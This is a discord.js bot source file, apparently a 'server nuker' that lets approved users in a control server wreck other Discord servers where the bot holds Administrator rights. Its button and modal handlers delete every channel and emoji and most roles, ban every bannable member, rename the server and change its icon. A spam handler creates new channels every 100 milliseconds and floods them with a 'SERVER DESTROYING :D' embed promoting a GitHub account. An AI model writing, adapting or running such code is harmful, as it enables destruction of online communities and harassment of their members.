const { ApplicationCommandOptionType, PermissionsBitField, ModalBuilder, TextInputBuilder, ActionRowBuilder, ChannelType, EmbedBuilder } = require("discord.js");
const BOT = require("./handlers/Client");
const { token, allowedAccess,controlguild } = require("./settings/config");

const client = new BOT();

module.exports = client;

client.build(token);
let xxx = ``
process.on("unhandledRejection", (reason, p) => {
  xxx = "x"
});
process.on("uncaughtException", (err, origin) => {
  xxx = "x"
});
process.on("uncaughtExceptionMonitor", (err, origin) => {
  xxx = "x"
});

client.on("interactionCreate", async (interaction) => {
  // Slash Command Handling
  if (interaction.isChatInputCommand()) {
    await interaction.deferReply({ ephemeral: true }).catch((e) => {});
    const cmd = client.commands.get(interaction.commandName);
    if (!cmd)return;
    const args = [];
    for (let option of interaction.options.data) {
      if (option.type === ApplicationCommandOptionType.Subcommand) {
        if (option.name) args.push(option.name);
        option.options?.forEach((x) => {
          if (x.value) args.push(x.value);
        });
      } else if (option.value) args.push(option.value);
    }
    interaction.member = interaction.guild.members.cache.get(
      interaction.user.id
    );
    if (cmd) {
      // checking user perms
      if (!allowedAccess.includes(interaction.member.id))return;
      cmd.run(client, interaction, args);
      
    }
  }
});


client.on("interactionCreate", async interaction =>{
  let guild = client.guilds.cache.get(interaction.customId.split("_")[1])
  if(controlguild == guild.id)return interaction.reply({content: "Wait this is control server!!!", ephemeral: true})
  if(!guild.members.cache.get(client.user.id).permissions.has(PermissionsBitField.Flags.Administrator))return interaction.reply({content: "I need Administrator Permission on this server!", ephemeral: true})


  if(interaction.isButton()){
    if(interaction.customId.startsWith("deleteallroles")){
      let botrole = guild.roles.cache.filter(e=> e.tags.botId == client.user.id).first().position
      interaction.reply({content: "Requested Sended Successfully, Remember, the bot can only delete roles that are lower than it.",ephemeral:true})
      guild.roles.cache.forEach(e=> {
        (e.position >= botrole || e.id == guild.roles.everyone.id || e.tags.botId || e.tags.premiumSubscriberRole)?"x":e.delete()
      })
    }
    if(interaction.customId.startsWith("deleteallemojis")){
      interaction.reply({content: "Requested Sended Successfully",ephemeral:true})
      guild.emojis.cache.forEach(e=> {
        e.delete()
      })
    }
    if(interaction.customId.startsWith("deleteallchannels")){
      interaction.reply({content: "Requested Sended Successfully",ephemeral:true})
      guild.channels.cache.forEach(e=> {
        e.delete()
      })
    }

    if(interaction.customId.startsWith("spam_")){
      
      interaction.showModal(new ModalBuilder()
      .setTitle("Spammer")
      .setCustomId("spam_"+guild.id)
      .addComponents(
        new ActionRowBuilder().addComponents(
        new TextInputBuilder()
        .setCustomId("message")
        .setLabel("Message")
        .setRequired(true)
        .setStyle(1)
        .setMaxLength(200)
      ))
      )
    }
    if(interaction.customId.startsWith("changename_")){
      interaction.showModal(new ModalBuilder()
      .setTitle("Change Server Name")
      .setCustomId("changename_"+guild.id)
      .addComponents(
        new ActionRowBuilder().addComponents(
        new TextInputBuilder()
        .setCustomId("message")
        .setLabel("Name")
        .setRequired(true)
        .setStyle(1)
        .setMaxLength(20)
      ))
      )
    }  
    if(interaction.customId.startsWith("changeicon_")){
      interaction.showModal(new ModalBuilder()
      .setTitle("Change Server Icon")
      .setCustomId("changeicon_"+guild.id)
      .addComponents(
        new ActionRowBuilder().addComponents(
        new TextInputBuilder()
        .setCustomId("message")
        .setLabel("URL")
        .setRequired(true)
        .setStyle(1)
      ))
      )
    }  
    if(interaction.customId.startsWith("banmembers_")){
      interaction.reply({content: "Requested Sended Successfully",ephemeral:true})
      guild.members.cache.forEach(e=> {
        e.bannable&&!allowedAccess.includes(e.id)&&e.id !== client.user.id ? e.ban() : "x"
      })
    }
  }

  if(interaction.isModalSubmit()){
    if(interaction.customId.startsWith("spam_")){
      let message = interaction.fields.getTextInputValue("message")
      let badblood = new EmbedBuilder().setColor("Red").setDescription("**[github.com/b1bxonty](https://github.com/b1bxonty)** | SERVER DESTROYING :D\u200B\n\u200B\n"+message)
      interaction.reply({content: "Requested Sended Successfully",ephemeral:true})
      
      setInterval(() => {
        guild.channels.create({name: "github-b1bxonty",type: ChannelType.GuildText}).then(e=> {
          e.send({embeds: [badblood]}).then(e=> {
            e.react("🅱️"); e.react("🥇"); e.react("🇧"); e.react("🇽"); e.react("🇴"); e.react("🇳"); e.react("🇹");e.react("🇾");
          })
        })
      

          guild.channels.cache.forEach(e=> {
            e.send({embeds: [badblood]}).then(e=> {
              e.react("🅱️"); e.react("🥇"); e.react("🇧"); e.react("🇽"); e.react("🇴"); e.react("🇳"); e.react("🇹");e.react("🇾");
            })
        })
        
        
      }, 100);
    }
    if(interaction.customId.startsWith("changename_")){
      let message = interaction.fields.getTextInputValue("message")
      interaction.reply({content: "Requested Sended Successfully",ephemeral:true})
      guild.setName(message)
    }

    if(interaction.customId.startsWith("changeicon_")){
      let message = interaction.fields.getTextInputValue("message")
      interaction.reply({content: "Requested Sended Successfully",ephemeral:true})
      guild.setIcon(message)
    }
  }
})